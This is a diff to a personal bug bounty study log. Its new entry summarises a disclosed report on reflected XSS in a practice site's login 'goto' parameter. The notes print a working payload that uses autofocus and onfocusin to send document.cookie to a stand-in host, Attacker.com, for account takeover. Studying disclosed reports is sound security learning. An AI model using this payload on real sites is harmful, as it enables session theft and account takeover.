@@ -325,7 +325,7 @@ Date - 10/11/2021
 Date - 11/12/2021
 
 - [x] solve tryhackme room ✅
-		- answer i question. 😒
+		- answer 1 question. 😒
 - [x] read zseano print book
 - [x] read firstblood1/2 Disclosed report
 - [x] want to create some usefull tool (if possible) ✅
@@ -363,5 +363,76 @@ Date - 12/12/2021
 
 ![---------------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/aqua.png)
 
+Date - 13/12/2021
+
+
+- [x] #solve tryhackme room ✅
+	- - answer 1 question. 😒 
+
+- [x] #read zseano print book
+- [x] #read firstblood1/2 Disclosed report ✅
+	- https://www.bugbountyhunter.com/hackevents/report?id=465 | 9:00AM - 10:35AM | (Reflected XSS on /login.php through the "goto" parameter leading to ATO)-(holybugx)-(quality report) 👌🏻
+
+			GET /login.php?goto=holy
+				\_reflected-value on source code
+					\_<input name="goto" value="holy" type="hidden">
+
+
+			GET /login.php?goto=holy<"'>
+				\_reflected-value on source code
+					\_<input name="goto" value="holy<"'>  --> input tag is closed
+						" type="hidden">
+
+
+			My thought we can also do like this:
+			------------------------------------
+			holy<"'>  -> holy"<' > (i dont know it can't be)
+
+
+			autofocus meanings:
+			-------------------
+			The autofocus attribute is a boolean attribute.
+			When present, it specifies that the element should automatically get focus when the page loads.
+
+
+			onfocusin:
+			----------
+			Execute a JavaScript when an input field is about to get focus.
+
+
+			Payload:
+			-------
+			https://firstbloodhackers.com/login.php?goto=xyz%22%20autofocus%20onfocusin=%22window.location.href=`http://Attacker.com/?${document.cookie}`%22%3E
+
+
+			Ultimate Payload:
+			-----------------
+			XSS payload are awesome.
+
+			when the value is reflected in source-code and using "autofocus" the input field automatically get in focus 
+			and "onfocusin" listening for any upcoming focus then he execute the JavaScript and BOOM.  
+
+
+			<input name="goto" value="xyz" autofocus onfocusin="window.location.href=`http://Attacker.com/?${document.cookie}`">
+
+		- https://www.bugbountyhunter.com/hackevents/report?id=479 ( Reflected XSS on /login.php using "goto" parameter and javascript scheme)-(sceniro changed exploit "goto" parameter using "javascript Schema")-(holybugx)-(quality report) 👌🏻
+		
+- [x] #want to create some usefull tool (if possible)
+- [x] #try to do some manual recon on BugBounty program / JS recon
+- [x] #leanring about things how web-application works on react-js,Node JS etc..  , Different type of CMS or Etc.. Etc.. 
+		- learned something abount jquary
+
+- [x] #try to read 1 intrigity-blog Bug-Bytes per day
+- [x] #try to read payload artirst weekly blog 
+- [x] #try to read anurag sr news latter
+- [x] #try to daily hunt on "fastfoodhacking" ✅
+		- Found something intersting . 
+- [x] #read disclosed report
+	- https://shahjerry33.medium.com/open-redirection-qr-code-magic-18ace1a0170f
+	- https://payatu.com/blog/nikhil-mittal/firefox-ios-qr-code-reader-xss-%28cve-2019-17003%29 (did not understand very well)
+	- https://securityflow.io/impact-of-an-insecure-deep-link/
+
+
+![---------------------------------------------------------](https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/aqua.png)
 
 
